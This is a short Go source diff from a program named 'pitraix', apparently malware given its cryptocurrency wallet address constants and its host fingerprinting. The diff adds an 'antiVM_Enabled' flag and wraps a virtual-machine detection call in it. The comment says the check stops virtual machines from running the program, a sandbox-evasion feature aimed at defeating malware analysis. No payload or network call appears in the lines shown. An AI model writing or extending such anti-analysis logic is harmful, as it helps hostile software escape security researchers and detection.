@@ -64,6 +64,9 @@ const (
 	bitcoinSegwitAddr = "OPTIONAL"
 	bitcoinLegacyAddr = "OPTIONAL"
 	ethereumAddr	  = "OPTIONAL"
+	
+	
+	antiVM_Enabled = false // turn this back to true if you don't want VMS to run pitraix
 
 	
 
@@ -1165,9 +1168,10 @@ func main() {
 
 	userHostname, machineType, osVariant, kernelVersion, archComp, machineVendor, machineModel, memory := getMachineInfo()
 	// fmt.Println(userHostname, osVariant, kernelVersion, arch, machineVendor, machineModel)
-
-	vmCheck(userHostname, cpuVendor, machineVendor, machineModel)
 	
+	if antiVM_Enabled == true {
+		vmCheck(userHostname, cpuVendor, machineVendor, machineModel)
+	}
 
 	rdmod.Seed(int64(bytesumbig([]byte(cpu + cpuVendor + userHomeDIR + "LHREWDHITOEAHEAR" + username))))
 
